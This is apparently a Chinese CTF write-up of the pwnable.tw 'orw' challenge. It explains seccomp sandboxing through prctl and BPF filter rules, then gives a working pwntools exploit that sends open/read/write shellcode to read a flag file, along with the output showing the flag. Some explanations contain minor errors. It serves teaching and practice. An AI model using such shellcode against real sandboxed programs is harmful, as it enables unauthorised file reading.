> 题目来源：[https://pwnable.tw/challenge/#2](https://pwnable.tw/challenge/#2)（orw）
>
> 参考资料：
>
> [https://www.anquanke.com/post/id/186447](https://www.anquanke.com/post/id/186447)
>
> [https://man7.org/linux/man-pages/man2/prctl.2.html](https://man7.org/linux/man-pages/man2/prctl.2.html)
>
> [https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/)
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A](https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A)  密码: hvqc
>
> --来自百度网盘超级会员V3的分享
>

# prctl-seccomp简介
seccomp 是 secure computing 的缩写，其是从 Linux kernel 2.6.23版本引入的一种简洁的 sandbox 机制，可以当作沙箱使用。在编写C语言程序过程中，可以通过引入prctl函数来实现内核级的安全机制；程序编译运行后，相当于进程进入到一种“安全”运行模式。为什么要引入这样一种安全机制？正常情况下在 Linux 系统里，大量的系统调用（system call）会直接暴露给用户态程序，也就是说程序可以使用所有的syscall，此时如果劫持程序流程通过exeve或system来调用syscall就会获得用户态的shell权限。可以看到并不是所有的系统调用都被需要，不安全的代码滥用系统调用会对系统造成安全威胁。为了防范这种攻击方式，这时seccomp就派上了用场，在严格模式下的进程只能调用4种系统调用，即 read()、write()、 exit() 和 sigreturn()，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用seccomp-tools查看。

> sandbox：沙箱、沙盒
>

# 使用seccomp-tools查看可用系统调用（识别沙箱规则）
> 这里使用pwnable.tw的challenge2来说明
>

安装方式：[https://github.com/david942j/seccomp-tools](https://github.com/david942j/seccomp-tools)

> Available on RubyGems.org!
>
> If you failed when compiling, try:
>
> and install seccomp-tools again.
>

```plain
$ gem install seccomp-tools
```

```plain
sudo apt install gcc ruby-dev
```

执行如下图中命令即可查看此ELF文件中可用的系统调用：

# ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610175378408-9009310a-79f0-4586-9f7b-04b92491a60e.png)
# 从IDA开始分析题目
将题目下载下来，我们先来看一下程序的代码，直接来到main函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610185576584-3a5fd389-871a-47af-82f0-c468a95f275a.png)

进入orw_seccomp函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610185630103-0a8dfae7-74af-4f65-bdec-8e1e7d50b457.png)

我们注意一下代码中的两个prctl：

```c
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v0);
```

先记住这两个函数，接下来会提到，这里暂时先放一放。

# prctl函数原型
看一下这个函数的原型：

```c
#include <sys/prctl.h> 
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); 
```

函数中有5个参数，重点来看一下参数中的“int option”，因为option的中文本意是选择，了解了这个参数我们也就知道整个函数要干嘛，这里我们需要重点关注两个选项：

```c
PR_SET_NO_NEW_PRIVS
PR_SET_SECCOMP
```

> 想仔细了解或提高英语水平的读者请到：[https://man7.org/linux/man-pages/man2/prctl.2.html](https://man7.org/linux/man-pages/man2/prctl.2.html)
>

先来看第一个，PR_SET_NO_NEW_PRIVS：

```c
Set the calling thread's no_new_privs attribute to the
value in arg2.  With no_new_privs set to 1, execve(2)
promises not to grant privileges to do anything that could
not have been done without the execve(2) call (for
example, rendering the set-user-ID and set-group-ID mode
bits, and file capabilities non-functional).  Once set,
the no_new_privs attribute cannot be unset.  The setting
of this attribute is inherited by children created by
fork(2) and clone(2), and preserved across execve(2).
```

简单的说，如果 option 设置为 PR_SET_NO_NEW_PRIVS并且第二个参数（unsigned long arg2）设置为 1，那么这个可执行文件不能够进行execve的系统调用（system 函数、one_gadget失效，但是其他的系统调用仍可以正常运行），同时这个选项还会继承给子进程。放到prctl函数中就是：

```c
prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);     //设为1
```

---

> [https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux%25E6%25B2%2599%25E7%25AE%25B1%25E4%25B9%258Bseccomp/)
>
> <font style="color:#23394D;">在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用</font>`seccomp_init`<font style="color:#23394D;">,</font>`seccomp_rule_add`<font style="color:#23394D;">,</font>`seccomp_load`<font style="color:#23394D;">来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。</font>
>
> <font style="color:#23394D;">首先，要使用它需要有</font>`CAP_SYS_ADMIN`<font style="color:#23394D;">权能，否则就要设置</font>`PR_SET_NO_NEW_PRIVS`<font style="color:#23394D;">位，若不这样做非root用户使用这个程序时</font>`seccomp`<font style="color:#23394D;">保护将会失效！设置了</font>`PR_SET_NO_NEW_PRIVS`<font style="color:#23394D;">位后能保证</font>`seccomp`<font style="color:#23394D;">对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行</font>`execve`<font style="color:#23394D;">这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用</font>`ptctl`<font style="color:#23394D;">也不能再把它禁用掉。</font>
>

---

在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了上述题目中的第一个 prctl 语句。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610176379405-be011a1a-6b34-4197-a063-6cfe68dcad83.png)

> 
>

接着看第二个options PR_SET_SECCOMP：

```c
Set the secure computing (seccomp) mode for the calling thread, 
to limit the available system calls.
```

一句话，这个参数是用来设置 seccomp ，其实也就是设置沙箱是否开启。

常常与它在prctl出现的还有如下两个参数：

```c
SECCOMP_MODE_STRICT：
    the only system calls that the thread is permitted to make are read(2),
	write(2),_exit(2) (but not exit_group(2)), and sigreturn(2). 

SECCOMP_MODE_FILTER (since Linux 3.5)：
    the system calls allowed are defined by a pointer to a Berkeley Packet 
    Filter passed in arg3.  This argument is a pointer to struct sock_fprog; 
	it can be designed to filter arbitrary system calls and system call arguments.
  
1、SECCOMP_MODE*STRICT(1)：
	允许线程进行的唯一系统调用是read（2），write（2），*exit（2）（但不是exit_group（2））
    和sigreturn（2）。

2、SECCOMP_MODE_FILTER(2) (since Linux 3.5)：
    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。 
    这个参数是一个指向struct sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数
```

上述英文大概说的是如果设置了 SECCOMP_MODE_STRICT 模式的话，系统调用只能使用 read, write,_exit 这三个。如果设置了 SECCOMP_MODE_FILTER 的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了，这个东西文章后面说。

将这几个参数带入到prctl：

```c
prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则
//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，
```

其中SECCOMP_MODE_FILTER 可以用常量表示为 2，回到之前的题，在第二个 prctl 函数中执行的就是：

```c
prctl(22, 2, &v0);
//IDA中反编译的不准确，其实&v0代表的就是过滤规则
//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）
```

上面v0所储存的内容表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止）：我们在IDA中具体看一下v0所定义的规则：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610192835546-ad4a0256-0be3-4474-8373-c225607c0503.png)

好家伙，我直接看不懂。但是其实这些内容已经在前面出现过：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610192879043-9f01b826-5951-4103-9ea2-5018b40ce1ef.png)

> 从图中可以看出现在只有open、write、read、sigreturn这四个系统调用可以使用。
>

对照一下，是不是一模一样？但是这些内容又意味这什么？上面的line、CODE、JT、JF、K又是什么意思？

# BPF 规则介绍
假如你上网搜问度娘，会得到以下结果：

> [https://baike.baidu.com/item/bpf/5307621](https://baike.baidu.com/item/bpf/5307621)
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610194487129-9eeed7cf-7c92-4af3-8587-ae1494525d65.png)

Q：BPF是数据链路层上的一种接口，它怎么会出现在系统调用中？

A：其实这原本是TCP协议包的过滤规则格式，后面被引用为沙箱规则。

---

简单的说BPF定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器（RegA），和赋值、算术、跳转指令。一条指令由一个定义好的结构struct bpf_insn表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。

&prog是指向如下结构体的指针，这个结构体记录了过滤规则个数与规则数组起始位置:

```c
struct sock_fprog {
   unsigned short      len;    /* Number of BPF instructions */
   struct sock_filter *filter; /* Pointer to array of BPF instructions */
};
```

而filter域就指向了具体的规则，每一条规则有如下形式：

```c
struct sock_filter {            /* Filter block */
    __u16 code;                 /* Actual filter code */
    __u8  jt;                   /* Jump true */
    __u8  jf;                   /* Jump false */
    __u32 k;                    /* Generic multiuse field */
};
```

为了操作方便定义了一组宏来完成filter的填写(定义在/usr/include/linux/bpf_common.h)：

```c
#ifndef BPF_STMT
#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }
#endif
#ifndef BPF_JUMP
#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }
#endif
```

样会简单一点，再来看看code，它是由多个”单词”组成的”短语”，类似”动宾结构”，”单词”间使用”+”连接：

```c
#define BPF_CLASS(code) ((code) & 0x07)         //首先指定操作的类别
#define		BPF_LD		0x00                    //将值cp进寄存器
#define		BPF_LDX		0x01
#define		BPF_ST		0x02
#define		BPF_STX		0x03
#define		BPF_ALU		0x04
#define		BPF_JMP		0x05
#define		BPF_RET		0x06
#define		BPF_MISC    0x07
	
/* ld/ldx fields */
#define BPF_SIZE(code)  ((code) & 0x18)         //在ld时指定操作数的大小
#define		BPF_W		0x00
#define		BPF_H		0x08
#define		BPF_B		0x10
#define BPF_MODE(code)  ((code) & 0xe0)         //操作数类型
#define		BPF_IMM		0x00
#define		BPF_ABS		0x20
#define		BPF_IND		0x40
#define		BPF_MEM		0x60
#define		BPF_LEN		0x80
#define		BPF_MSH		0xa0

/* alu/jmp fields */
#define BPF_OP(code)    ((code) & 0xf0)         //当操作码类型为ALU时，指定具体运算符
#define		BPF_ADD		0x00                    //到底执行什么操作可以看filter.h里面的定义
#define		BPF_SUB		0x10
#define		BPF_MUL		0x20
#define		BPF_DIV		0x30
#define		BPF_OR		0x40
#define		BPF_AND		0x50
#define		BPF_LSH		0x60
#define		BPF_RSH		0x70
#define		BPF_NEG		0x80
#define		BPF_MOD		0x90
#define		BPF_XOR		0xa0

#define		BPF_JA		0x00                    //当操作码类型是JMP时指定跳转类型
#define		BPF_JEQ		0x10
#define		BPF_JGT		0x20
#define		BPF_JGE		0x30
#define		BPF_JSET        0x40
#define BPF_SRC(code)   ((code) & 0x08)         
#define		BPF_K		0x00                    //常数
#define		BPF_X		0x08
```

另外与SECCOMP有关的定义在/usr/include/linux/seccomp.h，现在来看看怎么写规则，首先是BPF_LD，它需要用到的结构为：

```c
struct seccomp_data {
    int   nr;                   /* System call number */
    __u32 arch;                 /* AUDIT_ARCH_* value
                                  (在 <linux/audit.h> 里) */
    __u64 instruction_pointer;  /* CPU instruction pointer */
    __u64 args[6];              /* Up to 6 system call arguments */
};
```

其中args中是6个寄存器，在32位下是：ebx,ecx,edx,esi,edi,ebp，在64位下是：rdi,rsi,rdx,r10,r8,r9，现在要将syscall时eax的值载入RegA，可以使用：

```c
BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0)
//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据
//或者
BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))
```

而跳转语句写法如下：

```c
BPF_JUMP(BPF_JMP+BPF_JEQ,59,1,0)               
//这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转
```

其中后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。

最后当验证完成需要返回结果，即是否允许：

```c
BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)
```

过滤的规则列表里可以有多条规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。

总结一下：

1. **结构赋值操作指令为**：BPF_STMT、BPF_JUMP
2. **BPF 的主要指令有** BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令
3. **BPF 条件判断跳转指令**：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。
4. **返回指令**：BPF_RET、BPF_K，返回后面参数的值



例如ByteCTF中一道堆题的sock_filter结构体如下（和此篇文章中的题目无关，仅供参考）

```c
struct sock_filter filter[] = {
    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),          // 从第0个字节位置开始，加载读取系统调用号
    BPF_JUMP(BPF_JMP|BPF_JEQ, 257, 1, 0),       // 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行
    BPF_JUMP(BPF_JMP|BPF_JGE, 0, 1, 0),         // 比较系统调用号是否大于 0，是就跳到第6行
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), // 拒绝系统调用，返回 0
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), // 允许系统调用
};
```

拿本题的sock_filter结构体说明一下：

```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

line 1表示这道题需要运行在架构不为i386的机器或环境中，否则直接返回ERROR。

line 8表示如果传入的系统调用号为read，则允许执行，否则直接结束进程。

# 开始解题
经过前面的分析我们已经知道了此题只能使用只能使用 read、write、_exit、open。

老规矩，检查一下文件的保护机制：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610162110535-74f87059-815b-4b95-ab5e-aeed46622f75.png)

可以看到程序为32位，只开启了NX保护。main函数如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610185576584-3a5fd389-871a-47af-82f0-c468a95f275a.png)

很简单，输入shellcode之后程序就会执行它。

还有一个问题，system和execve都被禁用了怎么办？

读取flag的方式有很多，虽然无法拿到shell，但是我们可以用open、read、write三个系统调用去读flag，flag放在了/home/orw/flag。

同时题目已经给予了这个提示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610197208999-c565bb71-5605-4bd1-a569-e00fcd225d86.png)

因此这里考验我们直接编写shellcode的能力，这里注意

• 对于32位程序，应调用int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。

• 对于64位程序，应调用syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。

由于这道题是32位程序，因此编写shellcode如下：

```python
from pwn import *
context.log_level="debug"
p = remote('chall.pwnable.tw', 10001)

shellcode_open = 'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'
shellcode_read = 'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'
shellcode_write = 'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'
shellcode = shellcode_open + shellcode_read + shellcode_write
shellcode = asm(shellcode)
p.recvuntil(':')
p.sendline(shellcode)
print p.recv()
p.interactive()

'''
shellcode说明：                   
xor eax,eax      ;清空需要用到的寄存器
xor ebx,ebx
xor ecx,ecx
xor edx,edx

#fd = open('/home/orw/flag',0)
push 0x00006761;           ;"/home/orw/flag"的十六进制
push 0x6c662f77;           ;"/home/orw/flag"的十六进制
push 0x726f2f65;           ;"/home/orw/flag"的十六进制
push 0x6d6f682f;           ;"/home/orw/flag"的十六进制
mov ebx, esp;              ;const char __user *filename
mov eax, 0x5;              ;open函数的系统调用：sys_open
int 0x80;


#read(fd,bss+0x200,0x40)
mov ebx, eax;              ;int fd
mov ecx, 0x0804A260;       ;void *buf
mov edx, 0x40;             ;size_t count
mov eax, 0x3;              ;read函数的系统调用：sys_read
int 0x80;

#write(1,bss+0x200,0x40)
mov ebx, 0x1;              ;int fd=1 (标准输出stdout)(0 标准输入，1 标准输出，2 标准错误输出)
mov ecx, 0x0804A260;       ;void *buf
mov edx, 0x40;             ;size_t count
mov eax, 0x4;              ;read函数的系统调用：sys_read
int 0x80;
‘’‘
```

```python
➜  others python orw_exp.py 
[+] Opening connection to chall.pwnable.tw on port 10001: Done
[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-7bYAEr/step2 /tmp/pwn-asm-7bYAEr/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-7bYAEr/step3 /tmp/pwn-asm-7bYAEr/step4
[DEBUG] Received 0x17 bytes:
    'Give my your shellcode:'
[DEBUG] Sent 0x4f bytes:
    00000000  31 c0 31 db  31 c9 31 d2  68 61 67 00  00 68 77 2f  │1·1·│1·1·│hag·│·hw/│
    00000010  66 6c 68 65  2f 6f 72 68  2f 68 6f 6d  89 e3 b8 05  │flhe│/orh│/hom│····│
    00000020  00 00 00 cd  80 89 c3 b9  60 a2 04 08  ba 40 00 00  │····│····│`···│·@··│
    00000030  00 b8 03 00  00 00 cd 80  bb 01 00 00  00 b9 60 a2  │····│····│····│··`·│
    00000040  04 08 ba 40  00 00 00 b8  04 00 00 00  cd 80 0a     │···@│····│····│···│
    0000004f
[DEBUG] Received 0x40 bytes:
    00000000  46 4c 41 47  7b 73 68 33  6c 6c 63 30  64 69 6e 67  │FLAG│{sh3│llc0│ding│
    00000010  5f 77 31 74  68 5f 6f 70  33 6e 5f 72  33 34 64 5f  │_w1t│h_op│3n_r│34d_│
    00000020  77 72 69 74  33 7d 0a 00  00 00 00 00  00 00 00 00  │writ│3}··│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000040
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
```

FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}

> IDA中显示的bss段是不可执行的，但其实是可以执行的，应该是IDA错了
>

# prctl是否能绕过？
可以，之后再研究

[https://www.anquanke.com/post/id/219077](https://www.anquanke.com/post/id/219077)

[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/)

